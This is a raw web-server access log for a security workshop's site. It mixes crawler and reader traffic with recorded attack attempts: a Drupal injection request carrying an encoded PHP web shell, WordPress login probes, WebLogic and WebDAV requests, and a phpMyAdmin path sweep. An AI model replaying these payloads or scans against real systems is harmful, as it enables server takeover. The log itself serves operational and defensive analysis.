www.nspw.org:80 111.206.59.141 - - [01/May/2018:01:07:44 -0400] "GET / HTTP/1.1" 302 473 "http://www.so.com" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
www.nspw.org:80 148.251.75.46 - - [01/May/2018:01:08:12 -0400] "GET /2015/accepted HTTP/1.1" 302 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 40.77.167.84 - - [01/May/2018:01:10:17 -0400] "GET /papers/2010/nspw2010-coles.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 40.77.167.108 - - [01/May/2018:01:10:47 -0400] "GET /papers/2000/nspw2000-bruschi.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 40.77.167.188 - - [01/May/2018:01:11:49 -0400] "GET /papers/2009/nspw2009-tuerpe.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:01:12:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 40.77.167.108 - - [01/May/2018:01:12:50 -0400] "GET /papers/2001/nspw2001-blakley.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 40.77.167.206 - - [01/May/2018:01:13:13 -0400] "GET /papers/2001/nspw2001-taylor.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 49.144.234.164 - - [01/May/2018:01:13:24 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 49.144.234.164 - - [01/May/2018:01:13:26 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 209.30.115.106 - - [01/May/2018:01:15:37 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 209.30.115.106 - - [01/May/2018:01:15:37 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 39.42.114.54 - - [01/May/2018:01:16:52 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 39.42.114.54 - - [01/May/2018:01:16:53 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:01:17:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 120.29.109.164 - - [01/May/2018:01:17:53 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 120.29.109.164 - - [01/May/2018:01:17:55 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 86.89.69.45 - - [01/May/2018:01:17:57 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 86.89.69.45 - - [01/May/2018:01:17:58 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:01:19:05 -0400] "GET /current/dates.shtml HTTP/1.1" 302 567 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 49.150.62.176 - - [01/May/2018:01:20:36 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 49.150.62.176 - - [01/May/2018:01:20:37 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 40.77.167.108 - - [01/May/2018:01:20:55 -0400] "GET /papers/2004/nspw2004-zhou.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:01:22:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:01:23:22 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:01:24:47 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 40.77.167.84 - - [01/May/2018:01:27:19 -0400] "GET /papers/1999/nspw1999-timmerman.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:01:27:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 203.133.169.137 - - [01/May/2018:01:28:49 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 203.133.169.137 - - [01/May/2018:01:28:50 -0400] "GET /2009/ HTTP/1.1" 302 502 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:39 -0400] "PROPFIND / HTTP/1.1" 302 489 "-" "-"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:40 -0400] "PROPFIND / HTTP/1.1" 302 489 "-" "-"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:40 -0400] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 302 550 "-" "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:55 -0400] "GET /index.php HTTP/1.1" 302 549 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:56 -0400] "GET /phpmyadmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:56 -0400] "GET /phpMyAdmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:56 -0400] "GET /pmd/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:57 -0400] "GET /pma/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:57 -0400] "GET /PMA/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:57 -0400] "GET /PMA2/index.php HTTP/1.1" 302 558 "-" "Mozilla/5.0"
www.nspw.org:80 186.84.127.206 - - [01/May/2018:01:29:57 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:58 -0400] "GET /pmamy/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:58 -0400] "GET /pmamy2/index.php HTTP/1.1" 302 562 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:58 -0400] "GET /mysql/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:58 -0400] "GET /admin/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 186.84.127.206 - - [01/May/2018:01:29:59 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:59 -0400] "GET /db/index.php HTTP/1.1" 302 554 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:59 -0400] "GET /dbadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:59 -0400] "GET /web/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:00 -0400] "GET /admin/pma/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:00 -0400] "GET /admin/PMA/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:00 -0400] "GET /admin/mysql/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:00 -0400] "GET /admin/mysql2/index.php HTTP/1.1" 302 574 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:01 -0400] "GET /admin/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:01 -0400] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:01 -0400] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 302 584 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:02 -0400] "GET /mysqladmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:29:52 -0400] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 302 550 "-" "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:02 -0400] "GET /mysql-admin/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:02 -0400] "GET /phpadmin/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:02 -0400] "GET /phpmyadmin0/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:03 -0400] "GET /phpmyadmin1/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:03 -0400] "GET /phpmyadmin2/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:03 -0400] "GET /myadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:04 -0400] "GET /myadmin2/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:04 -0400] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:04 -0400] "GET /phpMyadmin_bak/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:05 -0400] "GET /www/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:05 -0400] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:05 -0400] "GET /phpmyadmin-old/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:05 -0400] "GET /phpMyAdminold/index.php HTTP/1.1" 302 576 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:06 -0400] "GET /pma-old/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:06 -0400] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 302 590 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:06 -0400] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 66.249.69.10 - - [01/May/2018:01:30:06 -0400] "GET /2017/dates HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:07 -0400] "GET /phpma/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:07 -0400] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:07 -0400] "GET /index.php HTTP/1.1" 302 549 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:07 -0400] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:07 -0400] "GET /phpmyadmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:08 -0400] "GET /phpMyAdmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:08 -0400] "GET /pmd/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:08 -0400] "GET /pma/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:09 -0400] "GET /PMA/index.php HTTP/1.1" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:09 -0400] "GET /PMA2/index.php HTTP/1.1" 302 558 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:09 -0400] "GET /pmamy/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:09 -0400] "GET /pmamy2/index.php HTTP/1.1" 302 562 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:10 -0400] "GET /mysql/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:10 -0400] "GET /admin/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:10 -0400] "GET /db/index.php HTTP/1.1" 302 554 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:11 -0400] "GET /dbadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:11 -0400] "GET /web/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:11 -0400] "GET /admin/pma/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:11 -0400] "GET /admin/PMA/index.php HTTP/1.1" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:12 -0400] "GET /admin/mysql/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:12 -0400] "GET /admin/mysql2/index.php HTTP/1.1" 302 574 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:12 -0400] "GET /admin/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:13 -0400] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:13 -0400] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 302 584 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:13 -0400] "GET /mysqladmin/index.php HTTP/1.1" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:13 -0400] "GET /mysql-admin/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:14 -0400] "GET /phpadmin/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:14 -0400] "GET /phpmyadmin0/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:14 -0400] "GET /phpmyadmin1/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:15 -0400] "GET /phpmyadmin2/index.php HTTP/1.1" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:15 -0400] "GET /myadmin/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:15 -0400] "GET /myadmin2/index.php HTTP/1.1" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:15 -0400] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:16 -0400] "GET /phpMyadmin_bak/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:16 -0400] "GET /www/phpMyAdmin/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:16 -0400] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:17 -0400] "GET /phpmyadmin-old/index.php HTTP/1.1" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:17 -0400] "GET /phpMyAdminold/index.php HTTP/1.1" 302 576 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:17 -0400] "GET /pma-old/index.php HTTP/1.1" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:17 -0400] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 302 590 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:18 -0400] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:18 -0400] "GET /phpma/index.php HTTP/1.1" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:18 -0400] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 125.64.43.248 - - [01/May/2018:01:30:19 -0400] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 302 592 "-" "Mozilla/5.0"
www.nspw.org:80 103.73.104.239 - - [01/May/2018:01:31:46 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 103.73.104.239 - - [01/May/2018:01:31:51 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:01:31:57 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 40.77.167.188 - - [01/May/2018:01:32:28 -0400] "GET /papers/2007/nspw2007-edwards.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:01:32:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 222.127.147.239 - - [01/May/2018:01:33:18 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 222.127.147.239 - - [01/May/2018:01:33:20 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 175.144.218.157 - - [01/May/2018:01:33:40 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 175.144.218.157 - - [01/May/2018:01:33:42 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.67.24.157 - - [01/May/2018:01:35:11 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.67.24.157 - - [01/May/2018:01:35:12 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 34.231.5.82 - - [01/May/2018:01:35:39 -0400] "HEAD /papers/1999/nspw1999-povey.pdf HTTP/1.1" 302 218 "-" "Blackboard Safeassign"
www.nspw.org:80 34.231.5.82 - - [01/May/2018:01:35:44 -0400] "GET /papers/1999/nspw1999-povey.pdf HTTP/1.1" 302 552 "-" "Blackboard Safeassign"
www.nspw.org:80 216.244.66.236 - - [01/May/2018:01:36:21 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 119.94.42.240 - - [01/May/2018:01:36:42 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 119.94.42.240 - - [01/May/2018:01:36:46 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 111.206.52.66 - - [01/May/2018:01:37:09 -0400] "GET / HTTP/1.1" 302 473 "http://www.so.com" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:01:37:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 149.147.53.128 - - [01/May/2018:01:38:36 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 149.147.53.128 - - [01/May/2018:01:38:38 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 110.54.241.225 - - [01/May/2018:01:39:34 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 110.54.241.225 - - [01/May/2018:01:39:35 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 54.36.148.218 - - [01/May/2018:01:40:01 -0400] "GET /papers/2005/?C=S;O=D HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 112.133.236.72 - - [01/May/2018:01:40:04 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 88.198.43.207 - - [01/May/2018:01:41:45 -0400] "GET /papers/1998/nspw1998-cowan.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 1084) AppleWebKit/536.28.10 (KHTML like Gecko) Version/6.0.3 Safari/536.28.10"
www.nspw.org:80 137.112.228.195 - - [01/May/2018:01:42:24 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:01:42:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
